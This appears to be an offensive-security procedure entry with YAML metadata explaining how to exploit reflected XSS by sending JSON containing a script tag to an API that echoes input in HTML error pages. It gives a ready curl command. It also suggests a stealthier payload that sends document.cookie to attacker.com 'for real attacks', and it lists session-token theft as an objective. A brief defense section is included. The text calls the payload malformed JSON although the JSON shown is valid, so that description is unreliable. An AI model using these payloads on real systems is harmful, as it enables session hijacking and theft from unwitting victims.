---
id: proc-reflected-xss-json-296094
tags:
  - xss
  - reflected-xss
  - json
  - web-vulnerability
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-send-invalid-json-xss]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:20.548Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-Reflected-XSS-with-Invalid-JSON-Input

## Summary

This procedure exploits a reflected XSS vulnerability by sending invalid JSON input containing a JavaScript payload to a web API endpoint. The server reflects the unsanitized input in an HTML error message, allowing execution of arbitrary JavaScript when the response is rendered in a browser, potentially leading to session theft or phishing attacks.

## Description

In this attack, the target web application processes JSON requests but fails to sanitize user input in error responses. By submitting malformed JSON with embedded HTML/JavaScript (e.g., a <script> tag), the error page echoes the payload directly into the HTML body without escaping special characters. When a victim views the error page—often tricked via a malicious link—the payload executes in their browser context. This is particularly effective on public-facing APIs where error details are exposed. Prerequisites include identifying a JSON endpoint that returns HTML errors; no authentication is typically needed. Expected outcomes include proof-of-concept execution like an alert box, with potential for escalation to cookie theft or keylogging.

## Requirements

1. Access to a web application with a JSON API endpoint that returns HTML-formatted error pages
2. Ability to send HTTP POST requests (e.g., via curl or browser dev tools)
3. Target must render error responses in a browser for payload execution

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs in error messages, using HTML entity encoding (e.g., convert < to &lt;)
- Avoid reflecting raw user input in HTML responses; use generic error messages instead
- Implement Content Security Policy (CSP) to block inline scripts
- Monitor for anomalous requests with script tags in JSON payloads via WAF logs

## Objectives

1. Elicit a server error response reflecting unsanitized input
2. Execute JavaScript in the victim's browser to demonstrate compromise
3. Escalate to steal sensitive data like cookies or session tokens

## Instructions

### Step 1: Identify Vulnerable Endpoint

**Context**: Locate an API endpoint that accepts JSON input and returns HTML error pages for invalid requests. Use browser inspection or documentation to find POST endpoints.

No specific command; manually test endpoints like /api/user or /api/submit.

> Expected: Confirm the endpoint returns HTML on invalid JSON (e.g., 400 Bad Request with body text).

### Step 2: Craft and Send Malicious Payload

**Context**: Create an invalid JSON string embedding a JavaScript payload, ensuring it's reflected without escaping.

**Command** ([[commands/curl-send-invalid-json-xss]]):
```bash
curl -X POST -H "Content-Type: application/json" -d '{"key": "<script>alert(\"XSS via JSON Error\")</script>"}' https://target.com/api/vulnerable-endpoint
```

> This sends a POST request with malformed JSON containing a script tag. The server parses it as invalid, reflects the payload in the error HTML like "Parse error: {"key": "<script>alert(\"XSS via JSON Error\")</script>"}". When opened in a browser, the alert fires. Adjust the URL and payload for the target; use a more stealthy payload like document.location='http://attacker.com/steal?cookie='+document.cookie for real attacks.

### Step 3: Verify Execution

**Context**: Render the response in a browser to confirm XSS triggers.

Copy the response HTML into an HTML file or use a proxy to view it.

> Expected: JavaScript executes, showing the alert or performing the intended action.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-send-invalid-json-xss]]

## Tools Used


## Tags

- xss
- reflected-xss
- json
- web-vulnerability
